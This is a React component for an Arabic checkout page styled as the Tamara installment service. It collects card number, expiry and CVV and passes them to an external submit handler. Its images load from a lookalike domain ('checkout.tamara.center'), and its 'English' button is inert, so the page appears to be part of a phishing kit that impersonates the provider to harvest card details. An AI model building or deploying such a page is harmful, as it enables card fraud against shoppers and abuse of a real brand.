import { useState } from 'react';
import { toEnglishNumbers, formatPrice } from '@/lib/utils';
import TamaraLogo from '@/components/TamaraLogo';

interface CardInfoProps {
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  setCardName: (value: string) => void;
  setCardNumber: (value: string) => void;
  setCardExpiry: (value: string) => void;
  setCardCvv: (value: string) => void;
  onBack: () => void;
  onSubmit: () => void;
  selectedPlan?: {
    totalAmount: number;
    installmentsCount: number;
    perInstallment: number;
  } | null;
}

const formatExpiry = (value: string): string => {
  const digits = toEnglishNumbers(value).replace(/\D/g, '');

  if (digits.length === 0) return '';

  if (digits.length === 1) {
    const first = parseInt(digits[0]);
    if (first > 1) return '0' + digits[0] + '/';
    return digits[0];
  }

  let month = digits.slice(0, 2);
  const monthNum = parseInt(month);

  if (monthNum > 12) month = '12';
  if (monthNum === 0) month = '01';

  const year = digits.slice(2, 4);

  if (digits.length >= 2) {
    return month + (year.length > 0 ? '/' + year : '/');
  }

  return month;
};

const isValidExpiry = (value: string): boolean => {
  const digits = toEnglishNumbers(value).replace(/\D/g, '');
  if (digits.length !== 4) return false;

  const month = parseInt(digits.slice(0, 2));
  if (month < 1 || month > 12) return false;

  const year = parseInt('20' + digits.slice(2, 4));
  const now = new Date();
  const expiry = new Date(year, month - 1);

  return expiry >= new Date(now.getFullYear(), now.getMonth());
};

// Card brand icons for inside input field
const CardBrandIcons = () => (
  <span className="brand-logos-inside" aria-hidden="true">
    <img src="https://checkout.tamara.center/v.jpg" alt="American Express" />
    <img src="https://checkout.tamara.center/vv.jpg" alt="Visa" />
    <img src="https://checkout.tamara.center/vvv.jpg" alt="Mastercard" />
    <img src="https://checkout.tamara.center/vvvv.jpg" alt="Mada" />
  </span>
);

const CardInfo = ({
  cardName,
  cardNumber,
  cardExpiry,
  cardCvv,
  setCardName,
  setCardNumber,
  setCardExpiry,
  setCardCvv,
  onBack,
  onSubmit,
  selectedPlan,
}: CardInfoProps) => {
  const [showPlanDetails, setShowPlanDetails] = useState(false);
  const [selectedInstallment, setSelectedInstallment] = useState<number | null>(null);
  
  const expiryInvalid = cardExpiry.length > 0 && !isValidExpiry(cardExpiry);
  const isFormValid = !!(cardNumber && cardExpiry && cardCvv && isValidExpiry(cardExpiry));

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value;
    const prev = cardExpiry;

    const isDeleting = raw.length < prev.length;
    if (isDeleting) {
      if (prev.endsWith('/') && raw === prev.slice(0, -1)) {
        setCardExpiry(raw.slice(0, -1));
      } else {
        setCardExpiry(raw);
      }
      return;
    }

    const formatted = formatExpiry(raw);
    setCardExpiry(formatted);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = toEnglishNumbers(e.target.value).replace(/\D/g, '');
    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
    setCardNumber(formatted);
  };

  // Calculate USD amount (approximate exchange rate: 1 USD = 3.75 SAR)
  const exchangeRate = 3.75;
  const monthlyAmountUSD = selectedPlan ? Math.round(selectedPlan.perInstallment / exchangeRate) : 0;
  const totalAmountUSD = selectedPlan ? Math.round(selectedPlan.totalAmount / exchangeRate) : 0;

  // Generate installment items
  const generateInstallments = () => {
    if (!selectedPlan) return [];
    const items = [];
    for (let i = 1; i <= selectedPlan.installmentsCount; i++) {
      const date = new Date();
      date.setMonth(date.getMonth() + i);
      items.push({
        number: i,
        amount: selectedPlan.perInstallment,
        date: date.toLocaleDateString('ar-SA', { month: 'long', year: 'numeric' })
      });
    }
    return items;
  };

  const installments = generateInstallments();

  return (
    <div
      className="min-h-screen flex flex-col"
      dir="rtl"
      style={{ 
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        background: '#F8F9FA'
      }}
    >
      <div className="max-w-[430px] mx-auto w-full flex flex-col flex-1">
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 bg-white">
          <TamaraLogo />
          <div className="flex items-center gap-3">
            <button
              onClick={() => {}}
              className="text-[14px] font-medium text-gray-500 hover:text-gray-700 transition-colors"
            >
              English
            </button>
            <span className="text-gray-300">|</span>
            <button
              onClick={onBack}
              aria-label="إغلاق"
              className="w-8 h-8 flex items-center justify-center rounded-full bg-gray-100 hover:bg-gray-200 transition-all"
            >
              <span className="text-lg leading-none text-gray-600">✕</span>
            </button>
          </div>
        </div>

        {/* Separator */}
        <div className="h-px bg-gray-200" />

        {/* Content */}
        <div className="flex flex-col flex-1" style={{ paddingBottom: '80px' }}>
          {/* Page Title */}
          <h1 className="page-title">التأكيد والدفع</h1>

          {/* Card Form Section */}
          <div className="card-form-section">
            {/* Card Header */}
            <div className="card-header">
              <span className="add-card-text">أضف بطاقة جديدة</span>
              <span className="radio-circle"></span>
            </div>

            {/* Card Number Input with Brand Icons Inside */}
            <div className="card-number-input-container" style={{ padding: '0 20px' }}>
              <div className="relative">
                <input
                  id="card_number"
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  placeholder="0000 0000 0000 0000"
                  className="card-input-field"
                  style={{ 
                    color: '#1F2937',
                    letterSpacing: '0.15em',
                    direction: 'ltr'
                  }}
                  maxLength={19}
                />
                <CardBrandIcons />
              </div>
            </div>

            {/* CVV and Expiry Row - No Gap */}
            <div className="cvv-expiry-row" style={{ padding: '0 20px 20px' }}>
              <div className="card-number-input-container">
                <input
                  value={cardExpiry}
                  onChange={handleExpiryChange}
                  placeholder="MM/YY"
                  className="card-input-field"
                  style={{ 
                    border: expiryInvalid 
                      ? '1px solid #EF4444' 
                      : 'none',
                    borderBottom: expiryInvalid 
                      ? 'none' 
                      : '1px solid var(--purple-line)',
                    color: '#1F2937',
                    direction: 'ltr'
                  }}
                  maxLength={5}
                />
                {expiryInvalid && (
                  <p className="text-xs mt-1 text-right" style={{ color: '#EF4444' }}>تاريخ انتهاء غير صالح</p>
                )}
              </div>
              <div className="card-number-input-container">
                <input
                  value={cardCvv}
                  onChange={e => setCardCvv(toEnglishNumbers(e.target.value))}
                  placeholder="CVV"
                  type="password"
                  className="card-input-field"
                  style={{ 
                    border: 'none',
                    borderBottom: '1px solid var(--purple-line)',
                    color: '#1F2937',
                    direction: 'ltr'
                  }}
                  maxLength={4}
                />
              </div>
            </div>
          </div>

          {/* Plan Section */}
          {selectedPlan && (
            <>
              <div className="plan-title">اختار الخطة</div>
              
              <div 
                className="plan-box"
                onClick={() => setShowPlanDetails(!showPlanDetails)}
              >
                <div className="plan-header">
                  <div className="plan-details">
                    <div className="monthly-amount">
                      {formatPrice(selectedPlan.perInstallment)} ريال
                      <span className="usd-badge">
                        <small>$</small>{monthlyAmountUSD}
                      </span>
                      <span>/شهرياً</span>
                    </div>
                    <div className="total-amount-details">
                      {selectedPlan.installmentsCount} دفعات · الإجمالي
                      <span>
                        {formatPrice(selectedPlan.totalAmount)} ريال
                        <span className="usd-badge" style={{ marginRight: '4px' }}>
                          <small>$</small>{totalAmountUSD}
                        </span>
                      </span>
                    </div>
                  </div>
                  <span className={`arrow-icon ${showPlanDetails ? 'rotated' : ''}`}>›</span>
                </div>
              </div>

              {/* Bottom Sheet for Installment Details */}
              <div className={`bottom-sheet ${showPlanDetails ? 'active' : ''}`}>
                <div className="bottom-sheet-header">
                  <span>تفاصيل الدفعات</span>
                  <button 
                    className="bottom-sheet-close"
                    onClick={(e) => { e.stopPropagation(); setShowPlanDetails(false); }}
                  >
                    ×
                  </button>
                </div>
                
                <span className="installment-plan-badge">
                  {selectedPlan.installmentsCount} دفعات
                </span>

                <div className="installment-list">
                  {installments.map((item, index) => (
                    <div 
                      key={index}
                      className="installment-item"
                      onClick={() => setSelectedInstallment(index)}
                    >
                      <div className="installment-left">
                        <span 
                          className="radio-fake"
                          style={{
                            borderColor: selectedInstallment === index ? 'var(--purple)' : '#777',
                            background: selectedInstallment === index ? 'var(--purple)' : 'transparent'
                          }}
                        />
                        <span className="installment-date">الدفعة {item.number} - {item.date}</span>
                      </div>
                      <div className="installment-amount">
                        <span className="usd-badge" style={{ marginRight: 0 }}>
                          <small>$</small>{Math.round(item.amount / exchangeRate)}
                        </span>
                        {formatPrice(item.amount)} ريال
                      </div>
                    </div>
                  ))}
                </div>

                <div className="installment-total">
                  الإجمالي: {formatPrice(selectedPlan.totalAmount)} ريال ({totalAmountUSD} $)
                </div>
              </div>

              {/* Overlay when bottom sheet is active */}
              {showPlanDetails && (
                <div 
                  style={{
                    position: 'fixed',
                    top: 0,
                    left: 0,
                    right: 0,
                    bottom: 0,
                    background: 'rgba(0,0,0,0.3)',
                    zIndex: 9998
                  }}
                  onClick={() => setShowPlanDetails(false)}
                />
              )}
            </>
          )}

          {/* Spacer */}
          <div className="flex-1" />
        </div>

        {/* Fixed Bottom Button - Payment Button */}
        <button
          onClick={onSubmit}
          disabled={!isFormValid}
          className={`payment-btn ${isFormValid ? 'active' : ''}`}
        >
          {selectedPlan 
            ? `ادفع ${formatPrice(selectedPlan.perInstallment)} ريال / شهر`
            : 'ادفع الآن'
          }
        </button>
      </div>
    </div>
  );
};

export default CardInfo;
